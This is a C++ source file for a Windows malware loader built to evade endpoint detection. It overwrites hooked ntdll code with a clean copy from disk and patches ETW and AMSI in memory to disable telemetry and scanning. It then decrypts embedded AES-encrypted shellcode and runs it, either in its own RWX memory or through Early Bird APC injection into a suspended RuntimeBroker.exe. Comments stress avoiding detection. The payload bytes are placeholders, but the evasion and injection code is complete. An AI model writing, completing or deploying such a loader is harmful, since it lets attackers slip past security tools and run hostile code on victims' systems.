// loader_edr_hybrid.cpp - EDR Evasion with Simple Injection
// Uses proven injection method from working loader + EDR bypasses
// Compile: x86_64-w64-mingw32-g++ -O2 -static -s loader_edr_hybrid.cpp -o loader.exe -lbcrypt -lntdll

#include <windows.h>
#include <winternl.h>
#include <bcrypt.h>
#include <tlhelp32.h>

#pragma comment(lib, "bcrypt.lib")
#pragma comment(lib, "ntdll.lib")

// Configuration
// #define USE_EARLY_BIRD_APC  // Comment this out to use simple self-injection (RECOMMENDED for reliability)

#ifdef USE_EARLY_BIRD_APC
    #define TARGET_PROCESS "C:\\Windows\\System32\\RuntimeBroker.exe"
    // Alternative targets if RuntimeBroker doesn't work:
    // #define TARGET_PROCESS "C:\\Windows\\System32\\dllhost.exe"
    // #define TARGET_PROCESS "C:\\Windows\\System32\\notepad.exe"
#endif

// Embedded encrypted shellcode
unsigned char encryptedShellcode[] = { /* ENCRYPTED_SHELLCODE_HERE */ };
unsigned int encryptedSize = sizeof(encryptedShellcode);

// AES-256 Key
unsigned char aesKey[32] = { /* AES_KEY_HERE */ };

// ==================== NTDLL UNHOOKING ====================
BOOL UnhookNTDLL() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    PIMAGE_DOS_HEADER pDosHeader = (PIMAGE_DOS_HEADER)hNtdll;
    PIMAGE_NT_HEADERS pNtHeaders = (PIMAGE_NT_HEADERS)((PBYTE)hNtdll + pDosHeader->e_lfanew);

    // Map clean copy of ntdll.dll from disk
    HANDLE hFile = CreateFileA("C:\\Windows\\System32\\ntdll.dll", GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
    if (hFile == INVALID_HANDLE_VALUE) return FALSE;

    HANDLE hFileMapping = CreateFileMappingA(hFile, NULL, PAGE_READONLY | SEC_IMAGE, 0, 0, NULL);
    CloseHandle(hFile);
    if (!hFileMapping) return FALSE;

    LPVOID pCleanNtdll = MapViewOfFile(hFileMapping, FILE_MAP_READ, 0, 0, 0);
    CloseHandle(hFileMapping);
    if (!pCleanNtdll) return FALSE;

    // Find .text section and restore it
    PIMAGE_SECTION_HEADER pSectionHeader = IMAGE_FIRST_SECTION(pNtHeaders);
    for (WORD i = 0; i < pNtHeaders->FileHeader.NumberOfSections; i++) {
        if (strcmp((char*)pSectionHeader[i].Name, ".text") == 0) {
            DWORD oldProtect;
            VirtualProtect((LPVOID)((PBYTE)hNtdll + pSectionHeader[i].VirtualAddress),
                pSectionHeader[i].Misc.VirtualSize, PAGE_EXECUTE_READWRITE, &oldProtect);

            memcpy((LPVOID)((PBYTE)hNtdll + pSectionHeader[i].VirtualAddress),
                (LPVOID)((PBYTE)pCleanNtdll + pSectionHeader[i].VirtualAddress),
                pSectionHeader[i].Misc.VirtualSize);

            VirtualProtect((LPVOID)((PBYTE)hNtdll + pSectionHeader[i].VirtualAddress),
                pSectionHeader[i].Misc.VirtualSize, oldProtect, &oldProtect);
            break;
        }
    }

    UnmapViewOfFile(pCleanNtdll);
    return TRUE;
}

// ==================== ETW PATCHING ====================
BOOL PatchETW() {
    HMODULE hNtdll = GetModuleHandleA("ntdll.dll");
    if (!hNtdll) return FALSE;

    FARPROC pEtwEventWrite = GetProcAddress(hNtdll, "EtwEventWrite");
    if (!pEtwEventWrite) return FALSE;

    DWORD oldProtect;
    if (!VirtualProtect((LPVOID)pEtwEventWrite, 1, PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;

    // Patch with RET instruction (0xC3)
    *(BYTE*)pEtwEventWrite = 0xC3;
    
    VirtualProtect((LPVOID)pEtwEventWrite, 1, oldProtect, &oldProtect);
    return TRUE;
}

// ==================== AMSI PATCHING ====================
BOOL PatchAMSI() {
    HMODULE hAmsi = LoadLibraryA("amsi.dll");
    if (!hAmsi) return TRUE; // AMSI not loaded, no need to patch

    FARPROC pAmsiScanBuffer = GetProcAddress(hAmsi, "AmsiScanBuffer");
    if (!pAmsiScanBuffer) return TRUE;

    // Patch to return E_INVALIDARG (0x80070057)
    // mov eax, 0x80070057; ret
    BYTE patch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
    DWORD oldProtect;
    
    if (!VirtualProtect((LPVOID)pAmsiScanBuffer, sizeof(patch), PAGE_EXECUTE_READWRITE, &oldProtect))
        return FALSE;

    memcpy((void*)pAmsiScanBuffer, patch, sizeof(patch));
    VirtualProtect((LPVOID)pAmsiScanBuffer, sizeof(patch), oldProtect, &oldProtect);
    
    return TRUE;
}

// ==================== AES-256 DECRYPTION ====================
BOOL AES_Decrypt(BYTE* encrypted, DWORD encSize, BYTE* key, BYTE** output, DWORD* outSize) {
    BCRYPT_ALG_HANDLE hAlg = NULL;
    BCRYPT_KEY_HANDLE hKey = NULL;
    NTSTATUS status;
    DWORD cbData, cbKeyObject;
    PBYTE pbKeyObject = NULL;
    
    BYTE* iv = encrypted;
    BYTE* ciphertext = encrypted + 16;
    DWORD cipherLen = encSize - 16;
    
    status = BCryptOpenAlgorithmProvider(&hAlg, BCRYPT_AES_ALGORITHM, NULL, 0);
    if (!BCRYPT_SUCCESS(status)) return FALSE;
    
    status = BCryptSetProperty(hAlg, BCRYPT_CHAINING_MODE, 
        (PBYTE)BCRYPT_CHAIN_MODE_CBC, sizeof(BCRYPT_CHAIN_MODE_CBC), 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }
    
    status = BCryptGetProperty(hAlg, BCRYPT_OBJECT_LENGTH, 
        (PBYTE)&cbKeyObject, sizeof(DWORD), &cbData, 0);
    if (!BCRYPT_SUCCESS(status)) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }
    
    pbKeyObject = (PBYTE)HeapAlloc(GetProcessHeap(), 0, cbKeyObject);
    if (!pbKeyObject) {
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }
    
    status = BCryptGenerateSymmetricKey(hAlg, &hKey, pbKeyObject, cbKeyObject, key, 32, 0);
    if (!BCRYPT_SUCCESS(status)) {
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }
    
    *output = (BYTE*)VirtualAlloc(NULL, cipherLen, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!*output) {
        BCryptDestroyKey(hKey);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }
    
    ULONG cbResult;
    status = BCryptDecrypt(hKey, ciphertext, cipherLen, NULL, iv, 16, *output, cipherLen, &cbResult, 0);
    
    if (!BCRYPT_SUCCESS(status)) {
        VirtualFree(*output, 0, MEM_RELEASE);
        *output = NULL;
        BCryptDestroyKey(hKey);
        HeapFree(GetProcessHeap(), 0, pbKeyObject);
        BCryptCloseAlgorithmProvider(hAlg, 0);
        return FALSE;
    }
    
    if (cbResult > 0) {
        BYTE padding = (*output)[cbResult - 1];
        if (padding > 0 && padding <= 16 && padding <= cbResult) {
            cbResult -= padding;
        }
    }
    
    *outSize = cbResult;
    
    BCryptDestroyKey(hKey);
    HeapFree(GetProcessHeap(), 0, pbKeyObject);
    BCryptCloseAlgorithmProvider(hAlg, 0);
    
    return TRUE;
}

// ==================== MAIN - DUAL INJECTION METHODS ====================
int main() {
    // Unhook NTDLL
    UnhookNTDLL();

    // Patch ETW
    PatchETW();

    // Patch AMSI
    PatchAMSI();

    // Decrypt shellcode
    BYTE* shellcode = NULL;
    DWORD shellcodeSize = 0;
    
    if (!AES_Decrypt(encryptedShellcode, encryptedSize, aesKey, &shellcode, &shellcodeSize)) {
        return 1;
    }

#ifdef USE_EARLY_BIRD_APC
    // ========== EARLY BIRD APC INJECTION (Modern Implementation) ==========
    // Based on Maldev Academy and current APT techniques
    
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb = sizeof(si);
    
    // Create target process in suspended state
    if (!CreateProcessA(
        TARGET_PROCESS,
        NULL,
        NULL,
        NULL,
        FALSE,
        CREATE_SUSPENDED | CREATE_NO_WINDOW,  // CREATE_NO_WINDOW to avoid visible window
        NULL,
        NULL,
        &si,
        &pi)) {
        SecureZeroMemory(shellcode, shellcodeSize);
        VirtualFree(shellcode, 0, MEM_RELEASE);
        return 1;
    }
    
    // Small delay to ensure process initialization
    Sleep(100);
    
    // Allocate memory in target process (RW first for writing)
    LPVOID pRemoteMem = VirtualAllocEx(
        pi.hProcess,
        NULL,
        shellcodeSize,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_READWRITE
    );
    
    if (!pRemoteMem) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        SecureZeroMemory(shellcode, shellcodeSize);
        VirtualFree(shellcode, 0, MEM_RELEASE);
        return 1;
    }
    
    // Write shellcode to target process
    SIZE_T bytesWritten;
    if (!WriteProcessMemory(pi.hProcess, pRemoteMem, shellcode, shellcodeSize, &bytesWritten)) {
        VirtualFreeEx(pi.hProcess, pRemoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        SecureZeroMemory(shellcode, shellcodeSize);
        VirtualFree(shellcode, 0, MEM_RELEASE);
        return 1;
    }
    
    // Clean up local copy immediately
    SecureZeroMemory(shellcode, shellcodeSize);
    VirtualFree(shellcode, 0, MEM_RELEASE);
    
    // Change memory permissions to RX (no write needed anymore)
    DWORD oldProtect;
    if (!VirtualProtectEx(pi.hProcess, pRemoteMem, shellcodeSize, PAGE_EXECUTE_READ, &oldProtect)) {
        VirtualFreeEx(pi.hProcess, pRemoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    
    // Queue APC to the main thread (Early Bird technique)
    // This will execute when the thread is resumed and enters alertable state
    if (QueueUserAPC((PAPCFUNC)pRemoteMem, pi.hThread, (ULONG_PTR)NULL) == 0) {
        VirtualFreeEx(pi.hProcess, pRemoteMem, 0, MEM_RELEASE);
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    
    // Small delay before resuming to ensure APC is queued
    Sleep(50);
    
    // Resume the main thread - APC will execute during thread initialization
    if (ResumeThread(pi.hThread) == (DWORD)-1) {
        TerminateProcess(pi.hProcess, 0);
        CloseHandle(pi.hProcess);
        CloseHandle(pi.hThread);
        return 1;
    }
    
    // Don't wait - let the process run independently
    // Close handles immediately to avoid detection
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    
#else
    // ========== SIMPLE SELF-INJECTION ==========
    // Allocate RWX memory in current process
    LPVOID pShellcode = VirtualAlloc(NULL, shellcodeSize, MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
    
    if (!pShellcode) {
        VirtualFree(shellcode, 0, MEM_RELEASE);
        return 1;
    }
    
    // Copy shellcode
    memcpy(pShellcode, shellcode, shellcodeSize);
    
    // Clean up decrypted copy
    SecureZeroMemory(shellcode, shellcodeSize);
    VirtualFree(shellcode, 0, MEM_RELEASE);
    
    // Create thread to execute shellcode
    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)pShellcode, NULL, 0, NULL);
    
    if (!hThread) {
        VirtualFree(pShellcode, 0, MEM_RELEASE);
        return 1;
    }
    
    // Wait for shellcode to complete initialization
    WaitForSingleObject(hThread, INFINITE);
    
    CloseHandle(hThread);
#endif
    
    return 0;
}
